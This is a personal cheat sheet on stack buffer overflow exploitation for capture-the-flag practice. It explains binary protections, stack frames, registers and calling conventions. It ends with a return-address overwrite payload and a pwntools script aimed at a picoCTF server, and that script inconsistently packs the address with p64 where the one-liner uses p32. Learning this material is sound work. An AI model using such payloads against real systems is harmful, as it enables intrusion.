

# Analyze 
- file, checksec
- strings, nm, objdump

Here’s your table converted into an unordered (bullet) list:

* **NX (No-Execute)**
  * If it's **OFF**: You can execute shellcode on the stack.
  * If it's **ON**: You must use **ROP (Return Oriented Programming)**.
* **Canary**
  * If it's **OFF**: Standard Buffer Overflow works.
  * If it's **ON**: You need to leak a **Stack Cookie (Canary)** first.
* **ASLR**
  * If it's **OFF**: **Libraries (libc)** and stack stay at the same address.
  * If it's **ON**: **Libraries** move every time; you need a libc leak.
* **PIE (Position Independent Executable)**
  * If it's **OFF**: **Binary code/data** (main, win, GOT) is at a fixed address.
  * If it's **ON**: **The binary itself** moves; you need a **base address leak** before using gadgets.
* **RELRO**
  * If it's **OFF**: You can overwrite the **Global Offset Table (GOT)**.
  * If it's **ON**: **Full RELRO** makes the GOT read-only; you must target hooks instead.


- ELF Metadata, Stripped

# Stack Frame Structure

| Memory Section | Purpose |
| :--- | :--- |
| **`Var2[10]`** | Your local variable (Low address). |
| **`Var1[10]`** | Your target variable. |
| **Compiler Padding** | Extra space the compiler adds to keep things aligned (usually 4–12 bytes). |
| **Saved EBP** | The **Base Pointer**. It's the "anchor" for the previous function's stack frame. |
| **Saved EIP** | The **Instruction Pointer** (or Return Address). **This is the "Holy Grail" of exploitation.** |
| **Arguments** | The pointers to `name` and `cmd` that were passed to the function. |

---

# Registers


1.  **EBP (Extended Base Pointer):**
    *   This is a reference point. The CPU uses it to find where local variables start.
    *   If you overwrite this, the program usually crashes (Segfault) when the function tries to finish because it "loses its place" in the stack.

2.  **EIP (Extended Instruction Pointer):**
    *   **The Brain:** This register tells the CPU exactly which memory address to execute next.
    *   When a function finishes (`return 0;`), the CPU looks at the **Saved EIP** on the stack and says: *"Okay, I'm done here, let me jump back to that address to continue the main program."*

---

# Calling Conventions

### 1. The Stack vs. Registers
Think of **Registers** (like EIP and EBP) as the CPU’s "workspace" or "scratchpad"—they are incredibly fast, located inside the CPU itself, but there are very few of them.

Think of the **Stack** as the "filing cabinet" in RAM—it's much larger, but slightly slower.

*   **EIP (The Pointer):** There is only **one** EIP register in the CPU. It always points to the instruction being executed *right now*.
*   **The Saved EIP (The Bookmark):** When you call a function like `fun()`, the CPU needs to remember where to go back to when `fun()` is finished. Since there's only one EIP register, the CPU **pushes** the current address onto the **Stack**. This is the "Saved EIP."


**"Not all registers have to be stored, is that?"** — You are exactly right.

In low-level programming (Assembly), we use "Calling Conventions." These are the rules for which registers a function must save and which ones it can "mess up."

*   **Callee-Saved Registers (e.g., EBP, EBX, ESI, EDI):** If a function (the "Callee") wants to use these, it **must** save the original values on the stack first and restore them before it finishes. This is why you see `Saved EBP` on the stack.
*   **Caller-Saved Registers (e.g., EAX, ECX, EDX):** The function can use these freely. If the calling function (like `main`) cares about the data in them, it has to save them itself before calling `fun()`.

# pwntools
pwn cyclic -l

# gdb + pwndbg / GEF
## configuration
- export LC_ALL=C.UTF-8
    - (gdb) set host-charset UTF-8
    - (gdb) set target-charset UTF-8
- gef config context.clear_screen False
##
- run < payload
- info, print
- pattern create, pattern search

# Payload
python3 -c "import sys; from pwn import *; sys.stdout.buffer.write(b'A'*48 + p32(0x8049276))" > missle

```
from pwn import *

# Connect to the server
io = remote('dolphin-cove.picoctf.net', 62610)

# Build payload
payload = b'A'*48 + p64(0x8049276)

# Send it
io.sendlineafter(b':', payload)

# Keep the connection open so you can read the flag
io.interactive()
```